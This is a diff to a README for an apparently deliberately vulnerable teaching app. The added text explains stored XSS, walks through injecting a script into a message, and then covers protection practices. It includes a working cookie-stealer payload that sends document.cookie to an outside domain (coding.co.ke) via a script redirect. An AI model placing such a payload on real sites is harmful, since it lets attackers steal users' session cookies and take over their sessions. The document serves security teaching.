@@ -68,14 +68,50 @@ Security Frameworks: Leverage security frameworks and libraries that provide bui
 
 
  ### Stored XSS
- Stored XSS, also known as persistent XSS, is the more damaging of the two. It occurs when a malicious script is injected directly into a vulnerable web application. Reflected XSS involves the reflecting of a malicious script off of a web application, onto a user's browser.
+ Stored XSS, also known as persistent XSS, is the more damaging of the two. It occurs when a malicious script is injected directly into a vulnerable web application, mostly it ca be stored in the database. This Script will execute when a user visits a Page that fetches the data containing the injected script. Reflected XSS on the other hand involves the reflecting of a malicious script off of a web application, onto a user's browser.
 
  This application also demonstrates stored XSS scenario and their Protection.
 
 
+ To test stored XSS in this application, Login to the application as a user, Navigate to Add Messages, Type the Message Title as "Request for Permission". In the Message Body Type a message which includes a Javascript code.. We will assume below code could be malicious. <br>
+
+       I was requesting for an off.
+        <script>alert("Hello JS");</script>
+       Thank you.
+
+Please confirm in the messages table in your database that the Above script has been saved as it is.
+This is what is called injected Script, The Attacker pretends to be posting a Message but instead the message is accompanied by some malicious code.
+<br>
+Now, logout and login as admin, assuming the admin want to read the posted messages.
+Once logged in as admin, click view messages.
+<br>
+What happens?<br>
+The Javascript injected or stored in one of the messages, executes!
+<br>
+![Alt text](image.png)
+<br>
+This means the attacker manages to execute their codes in your own application!
+<br>
+It also means the attacker can inject/plant a malicious code that could either; <br>
+1. Steal User cookies and sessions <br>
+2. Encrypt/Delete some data<br>
+3. Any other malicious code.<br>
+
+
+Here is an example of Javascript Cookie stealer that can be injected and stored, Once it executes it could steal user session data in the browser<br>
+
+Below code we steal victim's data stored in browser, i.e sessions and send to the attacker through https://coding.co.ke/ss/ domain. <br>
+
+Try Inject below code as a message in our App<br>
+
+      <script>
+         document.location='https://coding.co.ke/ss/cookiestealer.php?c='+document.cookie;
+      </script>
+
+
 
  ### XSS Protection
- o protect against stored XSS, follow these best practices:
+ To protect against stored XSS, follow these best practices:
 
 1. Input Validation and Sanitization<br>
 Whitelist Input Validation: Only allow expected inputs. For example, if a field is expected to contain only numbers, ensure that it contains only numbers.
